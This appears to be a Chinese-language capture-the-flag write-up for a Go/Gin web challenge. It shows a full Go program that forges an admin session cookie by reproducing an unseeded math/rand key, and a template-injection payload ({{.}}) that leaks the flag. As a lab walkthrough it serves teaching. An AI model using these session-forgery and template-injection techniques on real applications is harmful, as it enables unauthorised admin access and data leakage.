## 考点

`Go`中的伪随机数问题，还有ssti造成的信息泄露

## 工具

`Golang`环境

## 步骤

1. session伪造

   题目中使用go的`Math/rand`包生成16位的伪随机数作为Cookie的key。

   ```go
   // router.go
   func randomChar(l int) []byte {
       output := make([]byte, l)
       rand.Read(output)
       return output
   }
   ```

   ```go
   // main.go
   storage := cookie.NewStore(randomChar(16))
   r.Use(sessions.Sessions("o", storage))
   ```

   从官方文档中可以看到，当使用`math/rand`且并未调用`Seed` 函数时，默认随机数种子为1。
   并且看`adminRequired`函数

   ```go
   func adminRequired() gin.HandlerFunc {
   	return func(c *gin.Context) {
   		s := sessions.Default(c)
   		if s.Get("uname") == nil {
   			c.Redirect(302, "/login")
   			c.Abort()
   			return
   		}
   
   		if s.Get("uname").(string) != "admin" {
   			c.String(200, "No,You are not admin!!!!")
   			c.Abort()
   		}
   		c.Next()
   	}
   }
   ```

   判断是否为管理员的方法是从`session`中取出`uname`键是否等于"admin"，因此我们可以考虑伪造Cookie，将Cookie中的uname改为admin,从而取得管理员权限。

   伪造session的代码：

   ```go
   // 伪造 cookie
   package main
   
   import (
   	"math/rand"
   
   	"github.com/gin-contrib/sessions"
   	"github.com/gin-contrib/sessions/cookie"
   	"github.com/gin-gonic/gin"
   )
   
   func main() {
   	r := gin.Default()
   	storage := cookie.NewStore(randomChar(16))
   	r.Use(sessions.Sessions("o", storage))
   	r.GET("/a", cookieHandler)
   	r.Run("0.0.0.0:8000")
   }
   func cookieHandler(c *gin.Context) {
   	s := sessions.Default(c)
   	s.Set("uname", "admin")
   	s.Save()
   }
   func randomChar(l int) []byte {
   	output := make([]byte, l)
   	rand.Read(output)
   	return output
   }
   ```

2. 接下来就是go的ssti了

   ```go
   func flag(c *gin.Context) {
   	admin := &User{"admin", "flag{g0lan9_@lso_ha5_s0me_s3curi7y_i55ues}"}
   	name := c.DefaultQuery("name", "challenger")
   	templ := fmt.Sprintf(`
   	<html>
   		<head>
   			<title>Go Get It</title>
   		</head>
   		<h1>Hello %s</h1>
   	</html>	
   	`, name)
   	html, err := template.New("secret").Parse(templ)
   	if err != nil {
   		c.AbortWithError(500, err)
   	}
   	html.Execute(c.Writer, &admin)
   }
   ```

   `name`参数提交`{{.}}`就可以获取flag了。


## 总结

Go语言的考点不多，整体上还是很安全的，像这个`ssti`造成信息泄露，实际场景中，感觉没有人会这样写代码吧。
